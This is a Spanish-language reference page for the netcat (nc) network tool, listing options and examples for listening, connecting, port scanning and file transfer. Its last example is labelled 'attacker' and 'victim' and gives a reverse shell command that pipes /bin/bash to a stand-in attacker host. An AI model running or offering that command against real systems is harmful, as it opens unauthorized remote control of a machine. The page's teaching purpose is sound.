### **Básico/Utilidades de Red/nc.md**

# nc (Netcat)

## Descripción

`nc` (Netcat) es una herramienta de red versátil utilizada para leer y escribir datos a través de conexiones de red utilizando los protocolos TCP o UDP. Es conocida como la "navaja suiza" de las herramientas de red debido a su amplia gama de usos, incluyendo depuración, exploración de puertos, transferencia de archivos y creación de conexiones reversas.

## Uso

```bash
nc [opciones] destino puerto
```

### Opciones principales

- `-l`: Escucha en modo servidor.
- `-p`: Especifica el puerto local.
- `-v`: Modo verbose, proporciona información detallada.
- `-z`: Modo escaneo de puertos sin enviar datos.
- `-u`: Usa el protocolo UDP.
- `-w SEGUNDOS`: Establece un tiempo de espera para la conexión.
- `-e PROGRAMA`: Ejecuta un programa después de establecer la conexión.
- `-n`: No resuelve nombres de dominio.

## Ejemplos

- Escuchar en el puerto 1234:
  
  ```bash
  nc -l -p 1234
  ```

- Conectar a un servidor en el puerto 80:
  
  ```bash
  nc ejemplo.com 80
  ```

- Escaneo rápido de puertos:
  
  ```bash
  nc -zv ejemplo.com 20-30
  ```

- Transferir un archivo desde un servidor:
  
  En el servidor:
  
  ```bash
  nc -l -p 1234 > archivo_recibido.txt
  ```
  
  En el cliente:
  
  ```bash
  nc servidor.com 1234 < archivo_enviado.txt
  ```

- Crear una shell reversa:
  
  En el atacante:
  
  ```bash
  nc -l -p 4444
  ```
  
  En la víctima:
  
  ```bash
  nc atacante.com 4444 -e /bin/bash
  ```
